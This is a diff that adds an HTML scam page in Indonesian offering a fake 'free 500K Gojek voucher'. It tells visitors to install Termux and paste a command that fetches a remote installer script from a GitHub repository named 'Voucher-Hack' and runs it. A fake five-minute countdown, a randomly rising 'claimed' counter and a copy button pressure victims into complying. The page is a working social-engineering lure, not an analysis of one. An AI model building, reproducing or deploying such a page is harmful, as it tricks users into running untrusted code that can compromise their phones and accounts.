@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 CLAIM VOUCHER GOJEK 500K!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #ff0000, #990000);
+            font-family: Arial, sans-serif;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.8);
+            padding: 30px;
+            border-radius: 20px;
+            margin-top: 50px;
+            border: 3px solid gold;
+        }
+        h1 { font-size: 28px; margin-bottom: 20px; color: gold; }
+        .steps {
+            text-align: left;
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+        }
+        .step {
+            margin: 10px 0;
+            padding: 10px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 5px;
+        }
+        .code-box {
+            background: black;
+            color: lime;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            word-break: break-all;
+            border: 2px solid lime;
+        }
+        .btn {
+            background: linear-gradient(to right, #ff0000, #ff6600);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            display: inline-block;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 20px red;
+        }
+        .timer {
+            font-size: 24px;
+            color: yellow;
+            margin: 20px 0;
+        }
+        .counter {
+            background: rgba(255,255,255,0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        .blink {
+            animation: blink 1s infinite;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 VOUCHER GOJEK 500.000</h1>
+        <p class="blink">💰 GRATIS! TANPA SYARAT! 💰</p>
+        
+        <div class="steps">
+            <div class="step">📱 <strong>Step 1:</strong> Install Termux dari Play Store</div>
+            <div class="step">🚀 <strong>Step 2:</strong> Buka aplikasi Termux</div>
+            <div class="step">📋 <strong>Step 3:</strong> Copy command di bawah ini:</div>
+        </div>
+        
+        <div class="code-box" id="command">
+            bash -c "$(curl -fsSL https://raw.githubusercontent.com/piunjde/Voucher-Hack/main/scripts/installer.sh)"
+        </div>
+        
+        <button class="btn" onclick="copyCommand()">📋 COPY COMMAND</button>
+        
+        <div class="timer">
+            ⏰ BERAKHIR DALAM: <span id="countdown">05:00</span>
+        </div>
+        
+        <div class="counter">
+            ✅ <strong>1,567</strong> orang sudah claim!
+        </div>
+        
+        <div style="margin-top: 20px; font-size: 12px; color: #ccc;">
+            *Voucher akan dikirim otomatis ke Telegram Anda
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        let timeLeft = 300;
+        const countdown = document.getElementById('countdown');
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                countdown.textContent = "00:00";
+                countdown.style.color = "red";
+            }
+        }
+        
+        // Copy command
+        function copyCommand() {
+            const command = document.getElementById('command').innerText;
+            navigator.clipboard.writeText(command).then(() => {
+                alert('✅ Command copied! Paste di Termux sekarang!');
+            }).catch(err => {
+                console.error('Copy failed:', err);
+                prompt('Copy this command:', command);
+            });
+        }
+        
+        // Auto-update counter
+        let counter = 1567;
+        setInterval(() => {
+            counter += Math.floor(Math.random() * 3) + 1;
+            document.querySelector('.counter strong').textContent = counter.toLocaleString();
+        }, 3000);
+        
+        // Start timer
+        updateTimer();
+    </script>
+</body>
+</html>
